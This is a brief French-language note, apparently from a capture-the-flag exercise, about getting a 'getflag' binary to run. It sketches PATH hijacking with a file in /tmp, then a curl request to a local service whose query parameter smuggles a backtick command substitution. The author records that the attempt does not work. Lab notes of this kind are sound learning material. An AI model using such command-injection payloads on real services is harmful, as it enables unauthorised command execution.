do /tmp/GETFLAG et faire un lien symbolique de /bin/getflag a /tmp/GETFLAG
changer le path

quand on va call GETFLAG on va aller vers /tmp/GETFLAG qui va renvoyer le vrai getflag


```
echo "getflag" > /tmp/GETFLAG
touch /tmp/CC
```
```
curl localhost:4646/?x=`/*/GETFLAG>/*/CC` 
```

Ne marche pas
